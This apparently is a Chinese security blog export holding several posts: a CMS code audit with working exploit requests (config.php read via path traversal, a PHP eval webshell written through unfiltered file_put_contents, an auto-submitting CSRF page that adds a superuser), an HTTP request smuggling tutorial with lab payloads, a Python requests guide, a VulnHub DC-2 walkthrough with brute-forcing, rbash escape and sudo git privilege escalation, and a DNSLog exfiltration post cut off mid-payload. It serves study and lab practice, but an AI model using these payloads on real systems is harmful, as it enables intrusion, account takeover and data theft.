123456789101112GET &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;check_file.php?src&#x3D;..&amp;name&#x3D;config.php HTTP&#x2F;1.1Host: cms.cnPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7Connection: close 读取网站根目录下的config.php文件 文件上传漏洞 位置 /dapur/apps/app_theme/libs/save_file.php 第23-27行 分析 1234$c = $_POST[&quot;content&quot;];$f = $_POST[&quot;src&quot;]; $w = file_put_contents($f,$c); 没有过滤参数就拼接在file_put_contents函数中，构成文件上传漏洞 复现 payload如下： 1234567891011121314151617POST &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 97Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7Connection: closecontent&#x3D;&lt;?php eval($_POST[&#39;shell&#39;]); ?&gt;&amp;src&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php CSRF漏洞 位置 /dapur/apps/app_user/sys_user.php 第110-123行 分析 1234567891011121314if(isset($_POST[&#x27;save&#x27;]) or isset($_POST[&#x27;apply&#x27;]))&#123; $us=strlen(&quot;$_POST[user]&quot;); $ps=strlen(&quot;$_POST[password]&quot;); $user = $_POST[&#x27;user&#x27;]; $name = $_POST[&#x27;name&#x27;]; preg_match(&#x27;/[^a-zA-Z0-9]+/&#x27;, $user, $matches); if(!empty($_POST[&#x27;password&#x27;]) AND !empty($_POST[&#x27;user&#x27;])AND !empty($_POST[&#x27;name&#x27;])AND !empty($_POST[&#x27;email&#x27;])AND !empty($_POST[&#x27;level&#x27;])AND $_POST[&#x27;password&#x27;]==$_POST[&#x27;kpassword&#x27;] AND $us&gt;2 AND $ps&gt;3 AND @ereg(&quot;^.+@.+\\\\..+$&quot;,$_POST[&#x27;email&#x27;]) AND !$matches) &#123; $qr=$db-&gt;insert(FDBPrefix.&#x27;user&#x27;,array(&quot;&quot;,&quot;$user&quot;,&quot;$name&quot;,MD5(&quot;$_POST[password]&quot;),&quot;$_POST[email]&quot;,&quot;$_POST[status]&quot;,&quot;$_POST[level]&quot;,date(&#x27;Y-m-d H:i:s&#x27;),&#x27;&#x27;,&quot;$_POST[bio]&quot;)); 没有加入token验证，所以可以造成CSRF攻击，可以添加超级用户 复现 抓取添加用户的包 12345678910111213141516POST &#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add HTTP&#x2F;1.1Host: cms.cnContent-Length: 138Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;addAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3Connection: closeapply&#x3D;Next&amp;id&#x3D;&amp;z&#x3D;&amp;user&#x3D;test555&amp;z&#x3D;&amp;x&#x3D;&amp;password&#x3D;123456&amp;kpassword&#x3D;123456&amp;email&#x3D;test555%40qq.com&amp;level&#x3D;1&amp;name&#x3D;test555&amp;status&#x3D;1&amp;bio&#x3D;test555 构造好的用于建立超级用户的网页代码如下： 1234567891011121314151617181920212223&lt;html&gt; &lt;body&gt; &lt;form name=&quot;csrf&quot; action=&quot;http://cms.cn/dapur/?app=user&amp;act=add&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;apply&quot; value=&quot;Next&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;z&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;test555&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;z&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;x&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;123456&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;kpassword&quot; value=&quot;123456&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;test555&amp;#64;qq&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;level&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;test555&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;bio&quot; value=&quot;test555&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.csrf.submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 用户访问 test.html，就会立即生成test555的超级用户 任意文件修改漏洞 位置 /dapur/apps/app_config/sys_config.php 第190-193行 分析 1234$new_folder = $_POST[&#x27;folder_new&#x27;];$old_folder = $_POST[&#x27;folder_old&#x27;];if($old_folder != $new_folder) &#123; $ok = @rename(&quot;../$old_folder&quot;,&quot;../$new_folder&quot;); 对POST传递的参数$folder_new和$folder_old未进行过滤拼接至@rename函数进行文件名修改操作 复现 payload如下: 1234567891011121314151617POST &#x2F;dapur&#x2F;?app&#x3D;config HTTP&#x2F;1.1Host: cms.cnContent-Length: 147Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;configAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3Connection: closefolder_new&#x3D;config.txt&amp;folder_old&#x3D;config.php&amp;config_save&#x3D;1&amp;site_name&#x3D;1&amp;site_title&#x3D;1&amp;site_url&#x3D;1&amp;site_status&#x3D;1&amp;site_title&#x3D;1&amp;file_allowed&#x3D;1&amp;file_size&#x3D;1 将网站根目录config.php文件修改成config.txt文件，然后直接访问该文件即可查看","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"HTTP请求走私","slug":"HTTP请求走私","date":"2020-07-29T15:30:21.000Z","updated":"2020-07-29T15:30:21.000Z","comments":true,"path":"2020/07/29/HTTP请求走私/","link":"","permalink":"http://yoursite.com/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"","text":"产生原因 原因:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。 现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。 前置知识 HTTP/1.1的特性 Keep-Alive Keep-Alive（又称持久连接），在HTTP/1.1中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。 支持pipeline HTTP/1.1允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。 对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成 Conent-Length Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。 Transfer-Encoding 分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。 分块编码（Transfer-Encoding: chunked） 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。 每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\\r\\n)，也不包括分块数据结尾的 CRLF(\\r\\n)。 最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。 例： 123456789101112131415HTTP&#x2F;1.1 200 OKContent-Type: text&#x2F;plainTransfer-Encoding: chunked25\\r\\nThis is the data in the first chunk\\r\\n1C\\r\\nand this is the second one\\r\\n3\\r\\ncon\\r\\n0\\r\\n\\r\\n 几种走私类型 CL-TE 前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。 发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图： 原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为 1230\\r\\n\\r\\nG 总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到 120\\r\\n\\r\\n 在分块传输中，则代表结束，而后面的 G ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 G 的后面，如下： 1234GPOST &#x2F; HTTP&#x2F;1.1Host: acc71fe81ee21769802d39f600790089.web-security-academy.netConnection: close... 这就完成了一次成功的请求走私 在实际情况中是不会出现HTTP请求方式错误的，可以通过时间延迟来判断是否存在CL-TE类型的走私问题： 12345678POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 41AX 如果存在走私问题，下一个请求就会有明显的延迟。 或者使用下面的payload进行验证，如果存在走私问题，则会返回错误的页面： 12345678910POST &#x2F;search HTTP&#x2F;1.1Host: vulnerable-website.comContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 29Transfer-Encoding: chunked0GET &#x2F;404 HTTP&#x2F;1.1Foo: x 注意 由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。 TE-CL 前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。 简单判断payload 12345678POST &#x2F; HTTP&#x2F;1.1Host: ac361f181f029323806b3eea0007002e.web-security-academy.netContent-Length: 3Transfer-Encoding: chunked1G0 时间延迟payload 12345678POST &#x2F; HTTP&#x2F;1.1Host: ac361f181f029323806b3eea0007002e.web-security-academy.netTransfer-Encoding: chunkedContent-Length: 60X 响应差异payload 1234567891011POST &#x2F; HTTP&#x2F;1.1Host: ac361f181f029323806b3eea0007002e.web-security-academy.netContent-Length: 4Transfer-Encoding: chunked34GET &#x2F;404 HTTP&#x2F;1.1Content-Length: 17a&#x3D;BADHGSGSG0 注意 需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。 TE-TE 前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。 混淆的方式： 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked 简单判断payload 1234567891011121314POST &#x2F; HTTP&#x2F;1.1Host: ac261f3a1eb0e24580730eed00d70071.web-security-academy.netContent-Type: application&#x2F;x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10 利用HTTP请求走私漏洞 Bypass前端服务器安全验证 场景：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。 CL-TE 实验地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te 发送两次请求，响应消息反馈不允许重复header 于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了 完成删除用户 TE-CL 获取前端服务器对请求的重写情况 场景：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。 但走私的前提需具备一些条件： 存在一个POST请求，传入参数会储存并可以被查看 存在HTTP走私请求 构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败 尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问 页面上有个搜索框，输入任意内容，会在页面上返回出来 于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头 于是加入走私的请求，再尝试访问/admin发现成功 获取其他用户的cookie 参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。 HTTP header导致的XSS 场景：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。 将重定向转变为任意重定向 场景：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。 示例： 12345GET &#x2F;home HTTP&#x2F;1.1Host: normal-website.comHTTP&#x2F;1.1 301 Moved PermanentlyLocation: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F; 通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如： 12345678910POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comContent-Length: 54Transfer-Encoding: chunked0GET &#x2F;home HTTP&#x2F;1.1Host: attacker-website.comFoo: X 走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如： 1234567GET &#x2F;home HTTP&#x2F;1.1Host: attacker-website.comFoo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1Host: vulnerable-website.comHTTP&#x2F;1.1 301 Moved PermanentlyLocation: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F; 缓存投毒 构造一个页面中写入恶意的内容，比如写入alert(document.cookie) 发送请求走私的内容 1234567891011121314POST &#x2F; HTTP&#x2F;1.1Host: your-lab-id.web-security-academy.netContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 129Transfer-Encoding: chunked0GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1Host: anythingContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 10x&#x3D;1 再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。 打开主页 ⇒ 导致xss 缓存欺骗 缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。 寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的 发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存 12345678910POST &#x2F; HTTP&#x2F;1.1Host: your-lab-id.web-security-academy.netContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 42Transfer-Encoding: chunked0GET &#x2F;my-account HTTP&#x2F;1.1X-Ignore: X 打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到 原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为： 12345GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1Host: vulnerable-website.comCookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z...","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"request库使用","slug":"requests库","date":"2020-07-17T06:30:12.000Z","updated":"2020-07-17T06:30:12.000Z","comments":true,"path":"2020/07/17/requests库/","link":"","permalink":"http://yoursite.com/2020/07/17/requests%E5%BA%93/","excerpt":"","text":"构造请求 请求头 12headers=&#123;&#x27;Accept&#x27;: &#x27;application/vnd.github.v3.text-match+json&#x27;&#125;res = requests.get(url,headers) get请求 123456res = requests.get(url=&#x27;https://api.github.com/search/repositories&#x27;)参数# res = requests.get(url,params)# params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;# params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]# params=b&#x27;q=requests+language:python&#x27; 其他请求方法 12345678910&gt;&gt;&gt; requests.post(&#x27;https://httpbin.org/post&#x27;, data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;)&gt;&gt;&gt; requests.put(&#x27;https://httpbin.org/put&#x27;, data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;)&gt;&gt;&gt; requests.delete(&#x27;https://httpbin.org/delete&#x27;)&gt;&gt;&gt; requests.head(&#x27;https://httpbin.org/get&#x27;)&gt;&gt;&gt; requests.patch(&#x27;https://httpbin.org/patch&#x27;, data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;)&gt;&gt;&gt; requests.options(&#x27;https://httpbin.org/get&#x27;)消息体# data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;# data=[(&#x27;key&#x27;, &#x27;value&#x27;)&#125;# json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125; 响应处理 响应状态码 1status = res.status_code 响应头信息（键不分大小写） 1requests_header=res.headers[&#x27;content-type&#x27;] 响应内容 字节格式查看内容 12data = res.content# b&#x27;&#123;\\n &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\\n &quot;cur 字符串格式查看内容（序列化JSON） 12345因为对 bytes 解码到 str 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式res.encoding = &#x27;utf-8&#x27;data=res.text# &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur 字典形式内容（反序列化JSON） 123456data=res.json()# &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin提取内容repository = data[&#x27;items&#x27;][0]也可以使用 .text 获取 str 并使用json.loads() 对其进行反序列化json.loads(data) 其他 检查请求 1234requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等response.request.headers[&#x27;Content-Type&#x27;]response.request.urlresponse.request.body 身份验证 1234567891011使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get(&#x27;https://api.github.com/user&#x27;, auth=(&#x27;username&#x27;, getpass()))成功返回&lt;Response [200]&gt;，失败返回&lt;Response [401]&gt;HTTPBasicAuth效果同上&gt;&gt;&gt; from requests.auth import HTTPBasicAuth&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get(&#x27;https://api.github.com/user&#x27;, auth=HTTPBasicAuth(&#x27;username&#x27;, getpass()))requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth 关闭SSL证书验证 1&gt;&gt;&gt; requests.get(&#x27;https://api.github.com&#x27;, verify=False) 性能 超时 123456789101112131415&gt;&gt;&gt; requests.get(&#x27;https://api.github.com&#x27;, timeout=1)还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）&gt;&gt;&gt; requests.get(&#x27;https://api.github.com&#x27;, timeout=(2, 5))超时异常import requestsfrom requests.exceptions import Timeouttry: response = requests.get(&#x27;https://api.github.com&#x27;, timeout=1)except Timeout: print(&#x27;The request timed out&#x27;)else: print(&#x27;The request did not time out&#x27;) Session对象 1234567Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。import requestsfrom getpass import getpasswith requests.Session() as session: session.auth = (&#x27;username&#x27;, getpass()) response = session.get(&#x27;https://api.github.com/user&#x27;) 最大重试 1234567891011121314151617通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Sessionimport requestsfrom requests.adapters import HTTPAdapterfrom requests.exceptions import ConnectionErrorgithub_adapter = HTTPAdapter(max_retries=3)session = requests.Session()# Use `github_adapter` for all requests to endpoints that start with this URLsession.mount(&#x27;https://api.github.com&#x27;, github_adapter)try: session.get(&#x27;https://api.github.com&#x27;)except ConnectionError as ce: print(ce) 结尾 re库参考：https://juejin.im/post/5d8c630e51882511f444f65b","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"}],"tags":[{"name":"python库","slug":"python库","permalink":"http://yoursite.com/tags/python%E5%BA%93/"}]},{"title":"VulnHub渗透之DC-2","slug":"VulnHub渗透之DC-2","date":"2020-07-08T11:34:52.000Z","updated":"2020-07-08T11:34:52.000Z","comments":true,"path":"2020/07/08/VulnHub渗透之DC-2/","link":"","permalink":"http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/","excerpt":"","text":"0×00 说明 知识点：WordPress、受限shell、git提权 kali：192.168.101.10 靶机和kali处于同一局域网 0x01 信息收集 探测目标地址 命令：arp-scan -l 或者 nmap -sP 192.168.101.0/24 靶机地址为192.168.101.17 探测目标开放端口 命令：nmap -sV -p- 192.168.101.17 靶机开放了80端口和7744端口，7744为SSH，先访问下80 ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts 0x02 Flag1 访问成功，使用wappalyzer查看下网站所使用的技术 网站为 WordPress CMS构建，并且发现第一个flag 123456789Flag 1:Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another. 提示使用cewl工具，并且只有登陆之后才能看到下一个flag 0x03 Flag2 cewl工具可以根据url来生成对应的密码字典 命令：cewl -w /root/dic/dc2_passwd.txt http://dc-2/ 有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10 命令：wpscan --url http://dc-2/ -e u 接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描 工具可以用dirb，命令：dirb http://dc-2/ 字典地址都具备了，使用wpscan进行爆破 命令：wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt 爆破成功，结果如下： 123[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient 使用 jerry 登陆，找到了flag2 12345Flag 2:If you can&#39;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point. 意思是，WordPress行不通就换个方式 0x04 Flag3 于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以 ls 发现 flag3.txt 在当前目录下，但是使用 cat 却提示 -rbash: cat: command not found 这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，compgen还能使用，查看下当前可以执行的命令 命令：compgen -c 受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。 大概清楚了，查看当前环境变量：echo $PATH，发现位于/home/tom/usr/bin下，用vi转义受限制的shell： 123vi:set shell&#x3D;&#x2F;bin&#x2F;bash:shell 然后设置环境变量： 12export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATHexport SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL 成功绕过rbash，并读取了flag3.txt的内容 1Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 实际上，是要让我们切换 jerry 用户 0x05 Flag4 使用su jerry切换 jerry 用户，回到jerry的家目录查看，发现了flag4 1234567Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you&#39;re on your own now. :-)Go on - git outta here!!!! 告诉我们只差最后一个flag了，还提示了 git 0x06 Flag5 其实是使用git进行提权 12sudo git help config!&#x2F;bin&#x2F;bash 拿到最后的 flag .","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]},{"title":"通过DNSLog获取无回显信息","slug":"DNSLog","date":"2020-07-04T13:32:36.000Z","updated":"2020-07-04T13:32:36.000Z","comments":true,"path":"2020/07/04/DNSLog/","link":"","permalink":"http://yoursite.com/2020/07/04/DNSLog/","excerpt":"","text":"0x01 原理 NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址 一句话归纳😪😪： 将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。 案例解释 12ping &#96;whoami&#96;.test.com &#x2F;&#x2F;发出请求ping root.test.com &#x2F;&#x2F;实际请求 whoami在命令行中就自动解析了，所以其实是向root.test.com发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。 0x02 DNSLog平台 一、在线平台：http://ceye.io、http://www.dnslog.cn 二、自己搭建DNSLog服务器：https://github.com/BugScanTeam/DNSLog 三、 BurpSuite collaborator 点击Copy to Clipboard获取一个标识 比如我这里获取到的就是s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net 然后用这个外带就行了 0x03 DNSLog常用场景 SQL盲注 命令执行（无回显） XSS（无回显） SSRF(无回显) SQL盲注 以MySQL为例，在MySQL中有个一个load_file函数可以用来读取本地的文件。前提是root权限。 show variables like ‘%secure%’;查看load_file()可以读取的磁盘。 当secure_file_priv为空，就可以读取磁盘的目录。 当secure_file_priv为E:\\，就可以读取E盘的文件。 当secure_file_priv为null，load_file就不能加载文件。 ⚠️ 注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——UNC路径。 UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：\\\\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 ⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行转义，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。 几个例子 123456直接读取http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select 